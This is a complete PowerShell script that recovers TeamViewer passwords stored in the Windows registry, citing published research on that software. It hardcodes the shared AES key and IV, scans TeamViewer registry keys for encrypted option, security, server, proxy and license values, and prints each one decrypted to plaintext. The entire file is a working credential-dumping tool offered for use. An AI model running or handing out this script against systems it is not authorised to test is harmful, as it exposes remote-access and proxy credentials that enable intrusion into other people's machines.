# TeamViewer Registry Password Decrypter
# Based on https://whynotsecurity.com/blog/teamviewer

Write-Host @"

TeamViewer Stored Password Decrypter
Based on research by @whynotsecurity
https://whynotsecurity.com/blog/teamviewer

Scanning registry for encrypted TeamViewer passwords...
"@

# --- AES key and IV (well-known, published values) ---
$key = [byte[]]@(0x06,0x02,0x00,0x00,0x00,0xA4,0x00,0x00,
                  0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00)
$iv  = [byte[]]@(0x01,0x00,0x01,0x00,0x67,0x24,0x4F,0x43,
                  0x6E,0x67,0x62,0xF2,0x5E,0xA8,0xD7,0x04)

function Decrypt-TVPassword {
    param([byte[]]$CipherBytes)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key     = $key
    $aes.IV      = $iv

    try {
        $decryptor = $aes.CreateDecryptor()
        $plain = $decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
        return [System.Text.Encoding]::Unicode.GetString($plain).TrimEnd([char]0)
    }
    finally {
        $aes.Dispose()
    }
}

# --- Registry locations and value names to check ---
$roots = @(
    'HKLM:\SOFTWARE\TeamViewer',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer',
    'HKCU:\SOFTWARE\TeamViewer'
)
$targets = @(
    'OptionsPasswordAES',
    'SecurityPasswordAES',
    'SecurityPasswordExported',
    'ServerPasswordAES',
    'ProxyPasswordAES',
    'LicenseKeyAES'
)

$found = $false

foreach ($root in $roots) {
    if (-not (Test-Path $root)) { continue }

    # Collect all keys: the root itself + all children
    $allKeys = @(Get-Item $root -ErrorAction SilentlyContinue)
    $allKeys += Get-ChildItem $root -Recurse -ErrorAction SilentlyContinue

    foreach ($regKey in $allKeys) {
        $props = Get-ItemProperty $regKey.PSPath -ErrorAction SilentlyContinue
        if (-not $props) { continue }

        $hits = $targets | Where-Object { $props.PSObject.Properties.Name -contains $_ }
        if (-not $hits) { continue }

        $found = $true
        $path  = $regKey.PSPath -replace 'Microsoft\.PowerShell\.Core\\Registry::',''
        Write-Host "`n$path" -ForegroundColor Cyan

        foreach ($name in $hits) {
            $raw = $props.$name            # byte[] straight from the registry
            Write-Host ("  {0}  ({1} bytes)" -f $name, $raw.Length) -ForegroundColor Gray

            try {
                $password = Decrypt-TVPassword -CipherBytes $raw
                Write-Host "    -> $password" -ForegroundColor Green
            }
            catch {
                Write-Host "    -> [decryption failed: $_]" -ForegroundColor Red
            }
        }
    }
}

if (-not $found) {
    Write-Host "`nNo encrypted TeamViewer passwords found in the registry." -ForegroundColor Yellow
}
